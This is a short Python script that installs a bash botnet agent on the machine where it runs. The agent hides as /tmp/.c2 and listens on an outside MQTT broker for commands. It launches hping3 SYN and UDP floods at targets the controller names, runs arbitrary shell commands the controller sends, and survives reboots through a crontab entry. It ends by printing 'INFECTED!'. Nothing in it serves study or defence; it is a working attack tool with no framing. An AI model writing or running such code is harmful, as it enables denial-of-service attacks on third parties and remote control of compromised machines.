#!/usr/bin/env python3
import sys
BROKER_IP = sys.argv[1] if len(sys.argv) > 1 else "broker.hivemq.com"

agent = '''#!/bin/bash
cat > /tmp/.c2 <<'C2'
#!/bin/bash
while true; do
  mosquitto_sub -h {} -t c2/broadcast | while read line; do
    CMD=$(echo "$line" | cut -d: -f1)
    case $CMD in
      tcpsyn) hping3 -S -p $(echo $line|cut -d: -f3) --flood $(echo $line|cut -d: -f2) & ;;
      udpamp) hping3 --udp -p $(echo $line|cut -d: -f3) --flood $(echo $line|cut -d: -f2) & ;;
      shell) bash -c "$(echo $line|cut -d: -f2-)" & ;;
      kill|stop) pkill hping3 ;;
    esac
  done || sleep 10
done
C2
chmod +x /tmp/.c2
nohup /tmp/.c2 &
(crontab -l;echo "@reboot /tmp/.c2")|crontab -
'''.format(BROKER_IP)

subprocess.run(f"echo '{agent}' | bash", shell=True)
print("✅ INFECTED!")
